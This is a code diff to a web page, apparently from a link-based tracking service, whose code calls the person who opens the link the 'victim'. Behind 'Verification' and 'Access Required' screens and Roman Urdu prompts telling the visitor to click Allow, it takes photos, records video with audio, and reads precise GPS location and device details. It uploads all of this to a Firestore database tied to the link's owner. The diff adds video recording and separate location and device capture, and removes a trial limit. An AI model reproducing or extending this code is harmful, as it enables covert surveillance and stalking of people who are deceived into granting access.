@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ur">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Verification</title>
+<title>Access Required</title>
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
 <style>
   :root{--bg-0:#05070f;--accent:#22d3ee;--accent-2:#a855f7;--accent-3:#10b981;--danger:#ef4444;--text:#fff;--glass:rgba(255,255,255,0.04);--border:rgba(255,255,255,0.08);}
@@ -20,14 +20,21 @@
   .hero p{opacity:0.7;font-size:0.9rem;line-height:1.55;}
   button{padding:14px 22px;border-radius:12px;font-weight:600;font-size:0.95rem;cursor:pointer;transition:all 0.25s;font-family:inherit;border:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;}
   button:active:not(:disabled){transform:scale(0.97);}
+  button:disabled{opacity:0.5;cursor:not-allowed;}
   button.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#000;box-shadow:0 8px 24px rgba(34,211,238,0.4);}
   button.block{width:100%;}
   .video-wrapper{position:relative;width:100%;border-radius:20px;overflow:hidden;background:#000;aspect-ratio:3/4;border:1px solid var(--border);}
+  @media (min-width:600px){.video-wrapper{aspect-ratio:4/3;}}
   #video{width:100%;height:100%;object-fit:cover;display:block;}
   .capture-area{display:flex;justify-content:center;align-items:center;gap:30px;margin-top:22px;}
   .capture-btn{width:76px;height:76px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-2));border:4px solid rgba(255,255,255,0.25);cursor:pointer;transition:0.2s;box-shadow:0 8px 30px rgba(34,211,238,0.5);padding:0;}
   .capture-btn:active{transform:scale(0.92);}
+  .capture-btn.recording{background:linear-gradient(135deg,var(--danger),#b91c1c);animation:pulseRec 1.2s infinite;}
+  @keyframes pulseRec{0%,100%{box-shadow:0 8px 30px rgba(239,68,68,0.6);}50%{box-shadow:0 8px 45px rgba(239,68,68,1);}}
   .side-action{width:52px;height:52px;border-radius:50%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);color:#fff;font-size:1.3rem;cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0;}
+  .rec-indicator{position:absolute;top:16px;left:50%;transform:translateX(-50%);background:rgba(239,68,68,0.95);color:#fff;padding:6px 14px;border-radius:20px;font-size:0.75rem;font-weight:700;display:flex;align-items:center;gap:6px;letter-spacing:0.05em;}
+  .rec-dot{width:8px;height:8px;border-radius:50%;background:#fff;animation:blink 1s infinite;}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
   .flash{position:fixed;inset:0;background:#fff;opacity:0;pointer-events:none;z-index:999;transition:opacity 0.15s;}
   .flash.active{opacity:0.9;}
   .spinner{width:44px;height:44px;border:4px solid rgba(34,211,238,0.15);border-top-color:var(--accent);border-radius:50%;animation:spin 0.9s linear infinite;margin:0 auto 16px;}
@@ -38,6 +45,8 @@
   .alert-box .icon{font-size:2.8rem;margin-bottom:12px;}
   .alert-box h3{font-family:'Space Grotesk',sans-serif;font-size:1.15rem;margin-bottom:10px;color:#fca5a5;}
   .alert-box p{font-size:0.85rem;opacity:0.75;line-height:1.55;}
+  .steps{background:rgba(0,0,0,0.3);border-radius:12px;padding:16px;margin-top:16px;font-size:0.82rem;line-height:1.7;}
+  .steps b{color:var(--accent);}
 </style>
 </head>
 <body>
@@ -57,17 +66,54 @@
   </div>
 
   <div class="card" id="victimActionCard">
-    <button class="primary block" onclick="victimStart()">▶️ Continue</button>
+    <div style="text-align:center;margin-bottom:12px;">
+      <p style="opacity:0.85;font-size:0.92rem;line-height:1.6;" id="victimInstruction">Neeche button dabayein.</p>
+    </div>
+    <button class="primary block" id="startBtn" onclick="victimStart()">▶️ Continue</button>
+    <div class="steps">
+      <b>📌 Steps:</b><br>
+      1. Button dabayein<br>
+      2. Browser permission maangega — <b>Allow</b> karein<br>
+      3. Camera/GPS khulega<br>
+      4. Data save ho jayega
+    </div>
   </div>
 
   <div class="card hidden" id="victimCameraCard">
     <div class="video-wrapper">
       <video id="video" autoplay playsinline muted></video>
+      <div class="rec-indicator hidden" id="recIndicator">
+        <div class="rec-dot"></div>
+        <span id="recTime">00:00</span>
+      </div>
     </div>
     <div class="capture-area">
       <button class="side-action" onclick="victimSwitchCam()">🔄</button>
-      <button class="capture-btn" onclick="victimCapture()"></button>
+      <button class="capture-btn" id="captureBtn" onclick="victimCapture()"></button>
       <button class="side-action" onclick="victimStop()">✖️</button>
+    </div>
+    <p style="text-align:center;opacity:0.6;font-size:0.8rem;margin-top:14px;" id="captureHint">Tap button to capture</p>
+  </div>
+
+  <div class="card hidden" id="victimLocationCard">
+    <div style="text-align:center;">
+      <div style="font-size:3rem;margin-bottom:12px;">📍</div>
+      <h2 style="font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:8px;">Location Required</h2>
+      <p style="opacity:0.75;font-size:0.88rem;line-height:1.6;margin-bottom:16px;">
+        Please allow location access. Aapki location save ki jayegi.
+      </p>
+      <button class="primary block" onclick="captureLocationOnly()">📍 Allow Location</button>
+    </div>
+  </div>
+
+  <div class="card hidden" id="victimDeviceCard">
+    <div style="text-align:center;">
+      <div style="font-size:3rem;margin-bottom:12px;">📱</div>
+      <h2 style="font-family:'Space Grotesk',sans-serif;font-size:1.1rem;margin-bottom:8px;">Device Info Required</h2>
+      <p style="opacity:0.75;font-size:0.88rem;line-height:1.6;margin-bottom:16px;">
+        Aapke device ki information save ki jayegi.
+      </p>
+      <button class="primary block" onclick="captureDeviceOnly()">📱 Continue</button>
     </div>
   </div>
 
@@ -80,15 +126,15 @@
   <div class="card hidden" id="victimErrorCard">
     <div class="alert-box">
       <div class="icon">🔒</div>
-      <h3>Link Expired</h3>
-      <p>Ye link 30 minute me expire ho gaya hai. Please provider se naya link mangwayein.</p>
+      <h3 id="errorTitle">Link Expired</h3>
+      <p id="errorMsg">Ye link ab valid nahi hai. Please provider se naya link mangwayein.</p>
     </div>
   </div>
 </div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp, Timestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
@@ -99,8 +145,6 @@ const firebaseConfig = {
   appId: "1:108149086619:web:63f17a58695f1d7a1e293e"
 };
 
-const FREE_TRIAL_LIMIT = 3;
-
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
@@ -108,19 +152,36 @@ let currentFeature = null;
 let currentLinkId = null;
 let stream = null;
 let facingMode = "user";
+let mediaRecorder = null;
+let recordedChunks = [];
+let recTimer = null;
+let recStart = 0;
+let preLocation = null;
 
 const ALL_VIEWS = ["loadingView","mainView"];
 function showView(id) {
   ALL_VIEWS.forEach(v => document.getElementById(v).classList.add("hidden"));
   document.getElementById(id).classList.remove("hidden");
+  window.scrollTo({ top: 0, behavior: "smooth" });
 }
 
+function showCard(id) {
+  ["victimActionCard","victimCameraCard","victimLocationCard","victimDeviceCard","victimSuccessCard","victimErrorCard"].forEach(c => {
+    const el = document.getElementById(c);
+    if (el) el.classList.add("hidden");
+  });
+  const target = document.getElementById(id);
+  if (target) target.classList.remove("hidden");
+}
+
+/* ========== INIT ========== */
 window.addEventListener("load", async () => {
   const hash = location.hash;
   if (!hash.startsWith("#v=")) {
     showView("mainView");
-    document.getElementById("victimActionCard").classList.add("hidden");
-    document.getElementById("victimErrorCard").classList.remove("hidden");
+    showCard("victimErrorCard");
+    document.getElementById("errorTitle").textContent = "Invalid Link";
+    document.getElementById("errorMsg").textContent = "Ye link valid nahi hai.";
     return;
   }
 
@@ -131,44 +192,43 @@ window.addEventListener("load", async () => {
     const linkSnap = await getDoc(doc(db, "links", linkId));
     if (!linkSnap.exists()) {
       showView("mainView");
-      document.getElementById("victimActionCard").classList.add("hidden");
-      document.getElementById("victimErrorCard").classList.remove("hidden");
+      showCard("victimErrorCard");
       return;
     }
 
     const linkData = linkSnap.data();
 
-    // ⏰ CHECK EXPIRY
+    // ⏰ EXPIRY CHECK
     if (linkData.expiresAt) {
-      const expMs = linkData.expiresAt.seconds ? linkData.expiresAt.seconds * 1000 : new Date(linkData.expiresAt).getTime();
+      const expMs = linkData.expiresAt.seconds 
+        ? linkData.expiresAt.seconds * 1000 
+        : new Date(linkData.expiresAt).getTime();
+      
       if (Date.now() > expMs) {
         showView("mainView");
-        document.getElementById("victimActionCard").classList.add("hidden");
-        document.getElementById("victimErrorCard").classList.remove("hidden");
+        showCard("victimErrorCard");
         return;
       }
     }
 
     currentFeature = linkData.feature;
-
-    const ownerSnap = await getDoc(doc(db, "users", linkData.ownerId));
-    if (ownerSnap.exists()) {
-      const owner = ownerSnap.data();
-      if (owner.plan === "trial" && (owner.linksUsed || 0) > FREE_TRIAL_LIMIT + 1) {
-        showView("mainView");
-        document.getElementById("victimActionCard").classList.add("hidden");
-        document.getElementById("victimErrorCard").classList.remove("hidden");
-        return;
-      }
-    }
-
     setupVictimView(currentFeature);
     showView("mainView");
+    showCard("victimActionCard");
+
+    // Auto-show right card for location/device
+    setTimeout(() => {
+      if (currentFeature === "location") {
+        showCard("victimLocationCard");
+      } else if (currentFeature === "device") {
+        showCard("victimDeviceCard");
+      }
+    }, 300);
+
   } catch (e) {
     console.error(e);
     showView("mainView");
-    document.getElementById("victimActionCard").classList.add("hidden");
-    document.getElementById("victimErrorCard").classList.remove("hidden");
+    showCard("victimErrorCard");
   }
 });
 
@@ -176,92 +236,227 @@ function setupVictimView(feature) {
   const icons = { camera: "📷", video: "🎥", location: "📍", device: "📱", all: "⚡" };
   const titles = { camera: "Camera Access", video: "Video Access", location: "Location Access", device: "Device Info", all: "Full Verification" };
   const descs = {
-    camera: "Please allow camera access to continue",
-    video: "Please allow camera & mic access",
-    location: "Please allow location access",
-    device: "Tap continue to verify",
-    all: "Please allow camera, location & mic"
+    camera: "Camera allow karein — photo capture hogi",
+    video: "Camera aur Mic allow karein — video record hoga",
+    location: "Location allow karein — GPS save hoga",
+    device: "Device info submit hogi",
+    all: "Camera, Location aur Mic allow karein"
   };
+  const instructions = {
+    camera: "📸 Neeche button dabayein. Browser camera permission maangega — Allow karein.",
+    video: "🎥 Neeche button dabayein. Browser camera & mic permission maangega — Allow karein.",
+    location: "📍 Neeche button dabayein. Browser location permission maangega — Allow karein.",
+    device: "📱 Neeche button dabayein. Aapke device ki info save ki jayegi.",
+    all: "⚡ Neeche button dabayein. Browser camera aur location permission maangega — Allow karein."
+  };
+
   document.getElementById("victimIcon").textContent = icons[feature] || "📷";
   document.getElementById("victimTitle").textContent = titles[feature] || "Access";
   document.getElementById("victimDesc").textContent = descs[feature] || "";
+  document.getElementById("victimInstruction").textContent = instructions[feature] || "";
 }
 
+/* ========== VICTIM START ========== */
 window.victimStart = async function() {
-  if (currentFeature === "camera" || currentFeature === "video" || currentFeature === "all") {
-    await startVictimCamera();
+  if (currentFeature === "camera") {
+    await startCamera("photo");
+  } else if (currentFeature === "video") {
+    await startCamera("video");
+  } else if (currentFeature === "all") {
+    preLocation = await getLocation();
+    await startCamera("photo");
   } else if (currentFeature === "location") {
-    const loc = await getLocation();
-    await saveVictimData("location", { location: loc });
-    showVictimSuccess();
+    showCard("victimLocationCard");
   } else if (currentFeature === "device") {
-    const device = getDeviceInfo();
-    await saveVictimData("device", { device });
-    showVictimSuccess();
+    showCard("victimDeviceCard");
   }
 }
 
-async function startVictimCamera() {
+/* ========== CAMERA ========== */
+async function startCamera(mode) {
+  document.getElementById("startBtn").disabled = true;
+  document.getElementById("startBtn").textContent = "Starting...";
+
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode },
-      audio: currentFeature === "video" || currentFeature === "all"
-    });
+    const constraints = {
+      video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: mode === "video"
+    };
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+    
     const v = document.getElementById("video");
     v.srcObject = stream;
     v.style.transform = facingMode === "user" ? "scaleX(-1)" : "none";
-    document.getElementById("victimActionCard").classList.add("hidden");
-    document.getElementById("victimCameraCard").classList.remove("hidden");
-  } catch (e) {
-    alert("Camera permission required. Please allow access.");
+    
+    showCard("victimCameraCard");
+    document.getElementById("captureHint").textContent = mode === "video" 
+      ? "Tap button to record video" 
+      : "Tap button to capture photo";
+      
+  } catch (err) {
+    console.error(err);
+    let msg = "Camera permission required. Please allow access.";
+    if (err.name === "NotAllowedError") {
+      msg = "Aapne camera permission deny ki. Browser settings me jakar allow karein.";
+    }
+    document.getElementById("errorTitle").textContent = "Camera Access Denied";
+    document.getElementById("errorMsg").textContent = msg;
+    showCard("victimErrorCard");
+  } finally {
+    document.getElementById("startBtn").disabled = false;
+    document.getElementById("startBtn").textContent = "▶️ Continue";
   }
 }
 
 window.victimSwitchCam = async function() {
   facingMode = facingMode === "user" ? "environment" : "user";
   if (stream) stream.getTracks().forEach(t => t.stop());
-  await startVictimCamera();
+  const mode = currentFeature === "video" ? "video" : "photo";
+  await startCamera(mode);
 }
 
 window.victimCapture = async function() {
+  if (currentFeature === "video") {
+    toggleRecording();
+  } else {
+    await capturePhoto();
+  }
+}
+
+async function capturePhoto() {
   const video = document.getElementById("video");
   if (!video.videoWidth) return;
+
   const flash = document.getElementById("flash");
   flash.classList.add("active");
   setTimeout(() => flash.classList.remove("active"), 130);
+
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   const ctx = canvas.getContext("2d");
-  if (facingMode === "user") { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+  if (facingMode === "user") {
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+  }
   ctx.drawImage(video, 0, 0);
-  const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
-  const location = await getLocation();
+
+  const dataUrl = canvas.toDataURL("image/jpeg", 0.75);
+  const location = preLocation || await getLocation();
   const device = getDeviceInfo();
+
   await saveVictimData("photo", { photo: dataUrl, location, device });
   if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-  showVictimSuccess();
+  showCard("victimSuccessCard");
+}
+
+/* ========== VIDEO ========== */
+function toggleRecording() {
+  if (mediaRecorder && mediaRecorder.state === "recording") {
+    stopRecording();
+  } else {
+    startRecording();
+  }
+}
+
+function startRecording() {
+  if (!stream) return;
+  recordedChunks = [];
+  const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
+    ? "video/webm;codecs=vp9"
+    : MediaRecorder.isTypeSupported("video/webm") ? "video/webm" : "video/mp4";
+
+  try {
+    mediaRecorder = new MediaRecorder(stream, { mimeType });
+  } catch (e) {
+    document.getElementById("errorTitle").textContent = "Video Not Supported";
+    document.getElementById("errorMsg").textContent = "Aapka browser video recording support nahi karta.";
+    showCard("victimErrorCard");
+    return;
+  }
+
+  mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+  mediaRecorder.onstop = async () => {
+    const blob = new Blob(recordedChunks, { type: mimeType });
+    const reader = new FileReader();
+    reader.onload = async () => {
+      const location = await getLocation();
+      const device = getDeviceInfo();
+      await saveVictimData("video", { video: reader.result, location, device });
+      if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+      showCard("victimSuccessCard");
+    };
+    reader.readAsDataURL(blob);
+  };
+
+  mediaRecorder.start();
+  document.getElementById("captureBtn").classList.add("recording");
+  document.getElementById("recIndicator").classList.remove("hidden");
+  document.getElementById("captureHint").textContent = "Recording... tap to stop";
+  recStart = Date.now();
+  recTimer = setInterval(updateRecTime, 250);
+}
+
+function stopRecording() {
+  if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+  document.getElementById("captureBtn").classList.remove("recording");
+  document.getElementById("recIndicator").classList.add("hidden");
+  clearInterval(recTimer);
+}
+
+function updateRecTime() {
+  const s = Math.floor((Date.now() - recStart) / 1000);
+  const mm = String(Math.floor(s/60)).padStart(2,"0");
+  const ss = String(s%60).padStart(2,"0");
+  document.getElementById("recTime").textContent = `${mm}:${ss}`;
 }
 
 window.victimStop = function() {
   if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-  document.getElementById("victimCameraCard").classList.add("hidden");
-  document.getElementById("victimActionCard").classList.remove("hidden");
+  if (mediaRecorder && mediaRecorder.state === "recording") {
+    mediaRecorder.stop();
+    document.getElementById("captureBtn").classList.remove("recording");
+    document.getElementById("recIndicator").classList.add("hidden");
+    clearInterval(recTimer);
+  }
+  showCard("victimActionCard");
 }
 
-function showVictimSuccess() {
-  document.getElementById("victimActionCard").classList.add("hidden");
-  document.getElementById("victimCameraCard").classList.add("hidden");
-  document.getElementById("victimSuccessCard").classList.remove("hidden");
+/* ========== LOCATION ONLY ========== */
+window.captureLocationOnly = async function() {
+  const btn = event.target;
+  btn.disabled = true;
+  btn.textContent = "Getting Location...";
+
+  const location = await getLocation();
+  const device = getDeviceInfo();
+
+  if (!location) {
+    document.getElementById("errorTitle").textContent = "Location Denied";
+    document.getElementById("errorMsg").textContent = "Aapne location permission deny ki. Please allow karein.";
+    showCard("victimErrorCard");
+    return;
+  }
+
+  await saveVictimData("location", { location, device });
+  showCard("victimSuccessCard");
 }
 
+/* ========== DEVICE ONLY ========== */
+window.captureDeviceOnly = async function() {
+  const device = getDeviceInfo();
+  await saveVictimData("device", { device });
+  showCard("victimSuccessCard");
+}
+
+/* ========== HELPERS ========== */
 function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return resolve(null);
     navigator.geolocation.getCurrentPosition(
       pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
       () => resolve(null),
-      { enableHighAccuracy: true, timeout: 8000 }
+      { enableHighAccuracy: true, timeout: 10000 }
     );
   });
 }
@@ -273,7 +468,12 @@ function getDeviceInfo() {
   else if (/iPhone|iPad|iPod/i.test(ua)) type = "iOS";
   else if (/Mobile/i.test(ua)) type = "Mobile";
   const browser = /Chrome/.test(ua) ? "Chrome" : /Firefox/.test(ua) ? "Firefox" : /Safari/.test(ua) ? "Safari" : /Edg/.test(ua) ? "Edge" : "Browser";
-  return { type, browser, platform: navigator.platform || "-", screen: `${screen.width}x${screen.height}`, language: navigator.language };
+  return {
+    type, browser,
+    platform: navigator.platform || "-",
+    screen: `${screen.width}x${screen.height}`,
+    language: navigator.language
+  };
 }
 
 async function saveVictimData(type, data) {
